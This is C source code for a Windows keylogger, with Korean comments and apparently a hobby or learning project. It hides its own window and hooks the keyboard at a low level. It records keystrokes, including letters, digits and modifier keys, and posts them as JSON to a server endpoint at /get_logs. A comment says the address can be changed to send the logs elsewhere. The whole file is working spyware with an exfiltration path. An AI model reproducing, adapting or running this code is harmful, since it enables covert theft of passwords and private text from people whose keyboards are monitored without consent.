
#define _WINSOCK_DEPRECATED_NO_WARNINGS // 최신 VC++ 컴파일 시 경고 방지
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#define SERVERPORT 3000
#define BUFSIZE 512

HHOOK hHook;
char logBuffer[BUFSIZE];
int logBufferIndex = 0;

// 소켓 함수 오류 출력 후 종료
void err_quit(const char* msg)
{
    LPVOID lpMsgBuf = NULL;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, WSAGetLastError(),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf, 0, NULL);
    MessageBox(NULL, (LPCTSTR)lpMsgBuf, (LPCWSTR)msg, MB_ICONERROR);
    LocalFree(lpMsgBuf);
    exit(1);
}

// 소켓 함수 오류 출력
void err_display(const char* msg)
{
    LPVOID lpMsgBuf = NULL;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, WSAGetLastError(),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf, 0, NULL);
    printf("[%s] %s", msg, (char*)lpMsgBuf);
    LocalFree(lpMsgBuf);
}

// Node.js 서버에 POST 요청 보내기
void send_post_request(const char* server_ip, int port, const char* path, const char* json_data)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server = { 0 };
    char request[BUFSIZE];
    char response[BUFSIZE] = "\0";
    int recv_size;

    // Winsock 초기화
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        err_quit("WSAStartup()");

    // 소켓 생성
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        err_quit("socket()");

    // 서버 주소 설정
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // 서버에 연결
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
        err_quit("connect()");

    // POST 요청 메시지 작성
    size_t content_length = strlen(json_data);
    snprintf(request, BUFSIZE,
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n"
        "%s",
        path, server_ip, content_length, json_data);

    // 메시지 전송
    if (send(s, request, (int)strlen(request), 0) < 0)
        err_quit("send()");

    // 서버 응답 수신
    int total_recv_size = 0;
    while ((recv_size = recv(s, response + total_recv_size, BUFSIZE - total_recv_size - 1, 0)) > 0)
    {
        total_recv_size += recv_size;
        if (total_recv_size >= BUFSIZE - 1)
            break;
    }

    if (recv_size == SOCKET_ERROR)
    {
        err_display("recv()");
    }
    else if (total_recv_size == 0)
    {
        printf("No more data received from the server.\n");
    }
    else
    {
        // 응답 출력
        response[total_recv_size] = '\0'; // 수신된 데이터의 크기에 맞게 null 문자 추가
        printf("Response received:\n%s\n", response);
    }

    // 소켓 닫기
    closesocket(s);
    WSACleanup();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

        if (nCode >= 0 && (int)wParam == 256)    //프로세스에 메시지가 있는 경우
        {
            if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000))    //방금 ctrl이 눌린 상태
            {
                printf("Ctrl + ");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Ctrl + ");
            }
            else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000))    //방금 shift가 눌린 상태
            {
                printf("Shift + ");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Shift + ");
            }

            if (((GetAsyncKeyState(VK_LCONTROL) & 0x8000) != 0x8000) && (VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode))    //ctrl 중복출력을 막아보려 했으나 실패
            {
                printf("Ctrl \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Ctrl ");
            }
            else if (((GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0x8000) && (VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode))    //shift 중복출력을 막아보려 했으나 실패
            {
                printf("Shift \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Shift ");
            }
            else if (VK_RETURN == pKey->vkCode)
            {
                printf("Enter \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Enter ");
                logBuffer[logBufferIndex] = '\0';

                // JSON 데이터 생성
                char json_data[BUFSIZE];
                snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);

                // 서버로 데이터 전송
                send_post_request("127.0.0.1", 3000, "/get_logs", json_data); // 서버 주소 변경 가능

                // 버퍼 초기화
                logBufferIndex = 0;
            }
            else if (VK_SPACE == pKey->vkCode)
            {
                printf("Space \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Space ");
            }
            else if (VK_BACK == pKey->vkCode)
            {
                printf("Backspace \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Backspace ");
            }
            else if (VK_MENU == pKey->vkCode)
            {
                printf("Alt \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Alt ");
            }
            else if (VK_CAPITAL == pKey->vkCode)
            {
                printf("CAPS LOCK \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "CAPS LOCK ");
            }
            else if (VK_TAB == pKey->vkCode)
            {
                printf("Tab \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Tab ");
            }
            else if (VK_ESCAPE == pKey->vkCode)
            {
                printf("Escape \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Escape ");
            }
            else if (VK_LWIN == pKey->vkCode)
            {
                printf("Windows \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Windows ");
            }
            else if (VK_OEM_1 == pKey->vkCode)
            {
                printf("; \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "; ");
            }
            else if (VK_OEM_2 == pKey->vkCode)
            {
                printf("/ \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "/ ");
            }
            else if (VK_OEM_3 == pKey->vkCode)
            {
                printf("` \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "` ");
            }
            else if (VK_OEM_4 == pKey->vkCode)
            {
                printf("[ \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "[ ");
            }
            else if (VK_OEM_6 == pKey->vkCode)
            {
                printf("] \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "] ");
            }
            else if (VK_OEM_7 == pKey->vkCode)
            {
                printf("' \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "' ");
            }
            else if (VK_OEM_COMMA == pKey->vkCode)
            {
                printf(", \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ", ");
            }
            else if (VK_OEM_PERIOD == pKey->vkCode)
            {
                printf(". \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ". ");
            }
            else if (VK_OEM_PLUS == pKey->vkCode)
            {
                printf("= \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "= ");
            }
            else if (VK_OEM_MINUS == pKey->vkCode)
            {
                printf("- \n");
                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "- ");
            }
            else   //그외 문자들(숫자, 알파벳)
            {
                if ((pKey->vkCode >= 'A' && pKey->vkCode <= 'Z') || (pKey->vkCode >= '0' && pKey->vkCode <= '9'))
                {
                    printf("%c \n", pKey->vkCode);
                    logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "%c ", pKey->vkCode);
                }
            }
        }

    }


    CallNextHookEx(hHook, nCode, wParam, lParam);    //nCode < 0 : 프로세스에 메시지가 없을 경우


    return 0;
}

// 타이머 호출될 때마다 실행되는 함수
void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{   
    if (logBufferIndex >= 350)
    {
        // 데이터 전송 함수 호출
        logBuffer[logBufferIndex] = '\0';
        char json_data[BUFSIZE];
        snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);
        send_post_request("127.0.0.1", 3000, "/get_logs", json_data); // 서버 주소 변경 가능

        // 버퍼 초기화
        logBufferIndex = 0;
    }
}


int main(int argc, char* argv[])
{

    HWND hWnd = GetForegroundWindow();
    ShowWindow(hWnd, SW_HIDE); // 백그라운드 실행

    HMODULE hInstance = GetModuleHandle(NULL);    //자신의 module값을 가져온다.

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);    //후킹 프로시저를 설치

    UINT_PTR timerId = SetTimer(NULL, 0, 100, TimerProc); // .1초 (100밀리초)마다 타이머 호출

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))    //메시지 큐에 메시지가 있으면 MSG구조체에 저장하고 TRUE 반환하며, WM_QUIT일 경우 FALSE를 반환한다.
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);    //설치된 후킹 프로시저를 제거

    return 0;
}